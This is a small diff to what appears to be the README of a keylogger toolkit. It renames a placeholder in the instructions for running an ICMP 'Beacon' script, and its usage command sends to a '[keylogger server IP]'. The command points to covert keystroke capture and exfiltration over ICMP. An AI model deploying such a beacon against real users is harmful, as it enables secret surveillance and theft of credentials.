@@ -31,7 +31,7 @@ To find the full name of the network interface:
 Use the Description field of the relevant interface.
 
 ### Running the Beacon
-Run the Beacon component using the following command. Replace `[Description from ipconfig /all]` with the actual description of your network interface and `[keylogger server IP]` with the IP address of the server.
+Run the Beacon component using the following command. Replace `[interface]` with the actual description of your network interface and `[keylogger server IP]` with the IP address of the server.
 
 ```py ICMPbeacon.py -i "[interface]" -d [keylogger server IP]```
 
